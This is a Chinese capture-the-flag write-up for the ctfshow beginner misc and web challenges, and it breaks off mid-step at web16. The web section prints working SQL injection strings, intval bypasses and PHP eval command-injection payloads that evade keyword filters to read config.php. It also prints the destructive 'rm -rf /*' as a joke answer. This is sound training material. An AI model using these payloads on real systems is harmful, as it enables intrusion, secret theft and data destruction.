<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;MUZIKISG00D&#125;</span><br></pre></td></tr></table></figure>
<h3 id="杂项1"><a class="header-anchor" href="#杂项1">¶</a>杂项1</h3>
<p>打开，题目说明如下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B91/%28JU4MLHWM7%5D%60D2_K%7BP7T%5BPA.png" alt=""><br>
那我们直接拿这个md5去解一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B91/F%25ZBJ%40T~%25K%7BTI%5DRYX%60DUDJV.png" alt=""><br>
得到结果为：helloctf，所以flag是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;hello&#125;</span><br></pre></td></tr></table></figure>
<h3 id="杂项2"><a class="header-anchor" href="#杂项2">¶</a>杂项2</h3>
<p>下载下来得到一个压缩包，解压后是一张png图片<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B9%E4%BA%8C/QF%29BKVD%7D9VL3ONLAYJF%40%405U.png" alt=""><br>
丢进010观察，看到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B9%E4%BA%8C/XZR9%408LLSZROT6%25~D7%28%5B%2987.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;ctfshow_im_coming&#125;</span><br></pre></td></tr></table></figure>
<h3 id="萌新杂项3"><a class="header-anchor" href="#萌新杂项3">¶</a>萌新杂项3</h3>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B93/TR577_DC6Z9CP%40K_M%405W%609F.png" alt=""><br>
通过题目描述，可以得到这些数字97，10，01，还着重说了名字小五，银行卡密码只能是数字，那就是15谐音，所以一共是97,10,01,15，银行卡密码只有6位，所以就是互相组合一下，我是直接971015，把后面的01换成15成功了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;971015&#125;</span><br></pre></td></tr></table></figure>
<h3 id="杂项4"><a class="header-anchor" href="#杂项4">¶</a>杂项4</h3>
<p>下载得到一个加密压缩包，根据提示，密码为372开头的9位数字，所以我们先生成一个372000000到372999999的字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;pd.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">372000000</span>,<span class="number">373000000</span>,<span class="number">1</span>):</span><br><span class="line">        f.write(str(i)+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B94/IOYK~1KO%5BL%60TV2N832%5D%60K78.png" alt=""><br>
再进行压缩包爆破<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B94/N~TU%5DY68K_7H7%60N%5B2JRQ201.png" alt=""><br>
得到密码为372619038，所以flag为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;372619038&#125;</span><br></pre></td></tr></table></figure>
<h3 id="杂项5"><a class="header-anchor" href="#杂项5">¶</a>杂项5</h3>
<p>打开题目，下载得到一个txt文件名，但没有后缀，丢进010中查看<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B95/J%5D69%29X%7D%25%24F96V~%7BJ5AT3QFO.png" alt=""><br>
发现一段文字，拿去谷歌翻译看看…<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B95/V4DK2Z%25P%25MXAQBPR%28UC%28SQA.png" alt=""><br>
翻译看不出有什么有用的信息，但是注意到原文中有{}两个符号，还有F开头的大写，猜测全文的大写字母组合起来就是flag<br>
于是写个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author: dota_st</span></span><br><span class="line"><span class="string">Date: 2021-01-25 14:47:26</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = <span class="string">&quot;i was always Fond of visiting new scenes, and observing strange characters and manners. even when a mere chiLd i began my travels, and made mAny tours of discovery into foreiGn &#123;parts and unknown regions of my native City, to the frequent alarm of my parents, and The emolument of the town-crier. as i grew into boyhood, i extended the range oF my obServations. my holiday afternoons were spent in rambles about tHe surrounding cOuntry. i made myself familiar With all its places famous in history or fable. i kNew every spot where a murder or robbery had been committed, or a ghost seen. i visited the neighboring villages, and added greatly to my stock of knowledge,By noting their habits and customs, and conversing with their sages and great men.&#125;&quot;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span>((ord(i)&gt;=<span class="number">65</span> <span class="keyword">and</span> ord(i)&lt;=<span class="number">90</span>) <span class="keyword">or</span> (ord(i)==<span class="number">123</span> <span class="keyword">or</span> ord(i)==<span class="number">125</span>)):</span><br><span class="line">        result = result+i</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B95/0C~%7B9LK%280DUX%60WM%40ARE2S9J.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLAG&#123;CTFSHOWNB&#125;</span><br></pre></td></tr></table></figure>
<h3 id="杂项6"><a class="header-anchor" href="#杂项6">¶</a>杂项6</h3>
<p>得到一个压缩包，题目的意思透露是伪加密，当然有些压缩软件是无视伪加密，直接就能打开，这里我直接就打开看到了flag，不过还是说说预期的做法。首先用010打开压缩包，然后把这里的09改成00再保存，即可去除伪加密<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B96/NIN%5DT%7BE8B_T4ZQX%7DBCIH5KI.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;c_t_f_s_h_o_w&#125;</span><br></pre></td></tr></table></figure>
<h3 id="杂项7"><a class="header-anchor" href="#杂项7">¶</a>杂项7</h3>
<p>下载下来得到一个压缩包，打开是一个色图（出题人是个lsp），根据提示修改高度，放进010中修改高度<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B97/~8CSB%5D%24%288%24BYJ6L%408L7V7~D.png" alt=""><br>
png格式的话，从第二行开始，前四个字节代表宽度，后四个代表高度，修改完保存再打开就可以看到flag了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B97/YV0%5BHB%5B0YEH%7D29FJP6Z8MSX.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;beautiful&#125;</span><br></pre></td></tr></table></figure>
<h3 id="杂项8"><a class="header-anchor" href="#杂项8">¶</a>杂项8</h3>
<p>下载得到一个压缩包，解压后得到一张png图片<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B98/IVQ785%24IV1%7BDGYI_S2~%5BORN.png" alt=""><br>
很明显宽度被修改过导致图片损坏，所以我们去找找图片中的crc<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B98/%7DGH4%40STNGDV%5BK%40L%5B70JV%40%606.png" alt=""><br>
crc为：91918666，所以通过脚本进行爆破图片原本的宽度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author: dota_st</span></span><br><span class="line"><span class="string">Date: 2021-01-25 18:40:40</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;flag.png&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    data = bytearray(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> range(n):</span><br><span class="line">        width = bytearray(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> range(n):</span><br><span class="line">            height = bytearray(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == <span class="number">0x91918666</span>:</span><br><span class="line">                print(<span class="string">&quot;宽为：&quot;</span>, width, int.from_bytes(width, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">                print(<span class="string">&quot;高为：&quot;</span>, height, int.from_bytes(height, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>运行后得到<code>宽为： bytearray(b'\x00\x00\x02\x0c') 524</code>，所以在010中修改03成02保存即可得到正常图片，拿到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B98/flag.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;you_are_very_well&#125;</span><br></pre></td></tr></table></figure>
<h3 id="杂项9"><a class="header-anchor" href="#杂项9">¶</a>杂项9</h3>
<p>这道题大概就是修改game.dll达到魔兽争霸能开全图视野，然后提交修改的那个基址就可以。这道题不写，看我id应该能联想到曾经我也是dota玩家的一员，可惜如今已被开图弄得满目苍夷😭</p>
<h3 id="杂项10"><a class="header-anchor" href="#杂项10">¶</a>杂项10</h3>
<p>把图片缩小就能看到是“我好喜欢你”<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B910/FT4%24%24NTE8I%29L9EC_9XO%25TPH.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;我好喜欢你&#125;</span><br></pre></td></tr></table></figure>
<h3 id="杂项11"><a class="header-anchor" href="#杂项11">¶</a>杂项11</h3>
<p>下载下来得到一个图片，是jphs隐写，用工具解密，密码为空，保存为6.txt<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B911/UR5Y~%24GA52EE%60U%244%7DIOC7%7BU.png" alt=""><br>
打开6.txt，发现png头<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B911/0FWLI%24%7BG%5BF%28%7B%5BD~%60B%25OAE8E.png" alt=""><br>
修改6.txt成6.png，得到一张二维码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B911/6.png" alt=""><br>
扫描一下二维码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B911/8RRFSFO1UUU7%29PMH~MBNQ7W.png" alt=""><br>
把后面这串base64拿去解密，得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B911/%60K%60%40PZXGIZ%29W%7DRWT%24B1KO7K.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;战神归来发现自己儿子在刷题，一怒之下召唤10万将士来报仇&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Web"><a class="header-anchor" href="#Web">¶</a>Web</h2>
<h3 id="web1"><a class="header-anchor" href="#web1">¶</a>web1</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#39;id&#39;]))&#123;</span><br><span class="line">    $id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql &#x3D; &quot;select * from article where id &#x3D; $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row &#x3D; $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;!-- flag in id &#x3D; 1000 --&gt;</span><br><span class="line">&lt;&#x2F;html&gt; </span><br></pre></td></tr></table></figure>
<p>这里注意到有两个条件，第一个如果传入的id大于999则报错，而注释提示我们id等于1000的时候可以查询出flag。这里我们看到括号里的判断是用的intval函数</p>
<blockquote>
<p>intval函数特性：<br>
intval函数是获取变量的整型值，当它获取的变量不能被转换时返回0；<br>
如果字符串其中有数字，则返回数字；<br>
如果开头无法被转换，则返回0；</p>
</blockquote>
<p>所以我们可以用字符串的形式，如’1000’进行绕过<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web1/%60LZ29%5DJZ3L%29D%24%28%7B%292%60NIDJD.png" alt=""><br>
也可以换成<br>
二进制：0b1111101000<br>
16进制：0x3e8<br>
双重取反：~~1000<br>
或者100*10<br>
这里也存在sql注入<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web1/~SZMD3FOJY19SPW0P%605OUNW.png" alt=""><br>
当然省事的话直接按照他sql语句进行，取<code>?id=id--+</code>直接显示全部</p>
<h3 id="web2"><a class="header-anchor" href="#web2">¶</a>web2</h3>
<p>接着上道题，这里题目说管理员修改了一下代码，但还是能按照上题思路解出<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web2/J0%60%7BU%60N4P9_9D%25VKCR%299_KL.png" alt=""></p>
<h3 id="web3"><a class="header-anchor" href="#web3">¶</a>web3</h3>
<p>这次多加了过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;</span>,$id))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>但我们依然可以利用intval函数特性进行绕过<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web3/ND%60OP54_%28EFK97T%5B451%297ZS.png" alt=""></p>
<h3 id="web4"><a class="header-anchor" href="#web4">¶</a>web4</h3>
<p>这次再面基础上又多加了select语句过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;</span>,$id))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>但intval函数依然存在，我们继续构造?id='1000’获取flag</p>
<h3 id="web5"><a class="header-anchor" href="#web5">¶</a>web5</h3>
<p>这次不能再使用’1000‘获取flag了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;</span>,$id))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>可以看到，这次正则表达式中匹配了单引号和双引号，再使用<code>?id='1000'</code>，单引号就会被匹配到，回显id error<br>
但~没有被过滤，所以我们采取双重取反进行绕过，即构造<code>?id=~~1000</code>，就可获取到flag</p>
<h3 id="web6"><a class="header-anchor" href="#web6">¶</a>web6</h3>
<p>依然增加了正则表达式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|x|hex|\(|\)|\+|select/i&quot;</span>,$id))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>这次看到多匹配了一个<sup>，但我们不用</sup>，我们继续使用双重取反构造获取flag：<code>?id=~~1000</code></p>
<h3 id="web7"><a class="header-anchor" href="#web7">¶</a>web7</h3>
<p>oh，no!</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;</span>,$id))&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure>
<p>这次它终于把<code>~</code>加到正则表达式了，我们无法使用双重取反的套路了<br>
这次我们使用sql注入，采取<code>?id=id%23</code>进行注入，获取flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web7/D%60QTGOVBB_WRP_%28MEYRI%40%60U.png" alt=""></p>
<h3 id="web8"><a class="header-anchor" href="#web8">¶</a>web8</h3>
<p>emmm，这道题一开始我还以为是md5全相等，后面问了才知道这是个玩梗的题，即程序员离职删库跑路，命令<code>rm -rf /*</code>，Linux下强制递归删除文件。<br>
所以构造成?flag=rm -rf /*<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web8/4QL%290H49VUPBABI8LD180%29S.png" alt=""></p>
<h3 id="web9"><a class="header-anchor" href="#web9">¶</a>web9</h3>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/_YDF%29_0HEIUECJ%5DF%247T4%7BAW.png" alt=""><br>
考查eval命令执行，并且需要匹配到<strong>system|exec|highlight</strong>三个其中之一<br>
这里使用system命令配合tac读取config.php文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/Y8NXJHEEAK%60SW%7DQW%60M7~%5DYM.png" alt=""><br>
这里为啥不用cat命令读取？因为cat读取还需要右键查看源码才能看到flag，QWQ<br>
还可以使用highlight，构造成<strong>?c=highlight_file(“config.php”);</strong><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/WL%7D1TDTU%5DP%7D4Y%24202RZGM6T.png" alt=""><br>
还可以使用exec命令，构造成<strong>?c=exec(‘tac config.php’,$res);var_dump($res);</strong><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/_3BDIKSEX%28%5DA%25QMRU~%29MT%28V.png" alt=""></p>
<h3 id="web10"><a class="header-anchor" href="#web10">¶</a>web10</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次是正则匹配不允许使用，所以这里我们就不能直接使用这三个命令，可以采取命令拼接的方式构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;tac config.php&#39;);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web10/B_%40%40%5BP_YWOJ7FWSY%5BE%296%29CH.png" alt=""><br>
成功获取到flag</p>
<h3 id="web11"><a class="header-anchor" href="#web11">¶</a>web11</h3>
<p>这次是在前面基础上正则匹配到cat</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但我用的是tac，所以依然可以按照上题的解法构造，获取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;tac config.php&#39;);</span><br></pre></td></tr></table></figure>
<h3 id="web12"><a class="header-anchor" href="#web12">¶</a>web12</h3>
<p>这次居然连文件名也过滤了呜呜呜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这波你逼我的，我们利用base64编码进行命令执行<br>
把system经过base64编码后：c3lzdGVt<br>
把tac config.php经过base64编码后：dGFjIGNvbmZpZy5waHA=<br>
所以构成成这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;base64_decode(&quot;c3lzdGVt&quot;);$b&#x3D;base64_decode(&quot;dGFjIGNvbmZpZy5waHA&#x3D;&quot;);$a($b);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web12/C8BK0DY49JDXZJSGCNB%25Z%5D3.png" alt=""><br>
成功获取到flag</p>
<h3 id="web13"><a class="header-anchor" href="#web13">¶</a>web13</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次正则匹配增加了.和；符号，也就意味着我们不能再拼接执行语句了<br>
不过还有两个命令执行函数passthru()和assert()函数</p>
<blockquote>
<p>passthru()直接将结果输出到浏览器<br>
assert()中如果是字符串，会将其当作php代码执行</p>
</blockquote>
<p>使用passthru()<br>
在linux中，反引号的作用是将执行的内容赋予变量，构造如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;passthru(&#39;tac &#96;ls&#96;&#39;)?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web13/_A1DOADK%40Y2SY7~3A4N5_I5.png" alt=""><br>
使用assert()<br>
因为正则表达式的过滤，所以这里还是将system(‘tac config.php’)进行base64编码成c3lzdGVtKCd0YWMgY29uZmlnLnBocCcp<br>
构造如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;assert(base64_decode(&#39;c3lzdGVtKCd0YWMgY29uZmlnLnBocCcp&#39;))?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web13/H3RUCLH9F2_HW%60%249J%5BWG5UO.png" alt=""><br>
皆可获取到flag</p>
<h3 id="web14"><a class="header-anchor" href="#web14">¶</a>web14</h3>
<p>太可恶了，这次居然连(也给匹配到了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不过我还有妙计，利用单引号进行绕过，构造如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo &#96;tac conf&#39;&#39;ig?p&#39;&#39;hp&#96;?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web14/FI9QR%4026UGPQKOK%5BC%5DT6IN4.png" alt=""><br>
成功获取flag</p>
<h3 id="web15"><a class="header-anchor" href="#web15">¶</a>web15</h3>
<p>阿呆又发疯了，这次把&gt;也给过滤了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>不过，这次我再给你重拳一击，用惯了get，这次我就用post打得你满地找牙，构造如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo &#96;$_POST[a]&#96;;</span><br><span class="line">post：a&#x3D;tac config.php</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web15/EPV2W%29NLVEZ%254B%7DC%40J_Z_DR.png" alt=""><br>
获取到flag</p>
<h3 id="web16"><a class="header-anchor" href="#web16">¶</a>web16</h3>
<p>看一下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="string">&quot;ctfshow<span class="subst">$c</span>&quot;</span>)===<span class="string">&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>把这串md5去解一下<br>
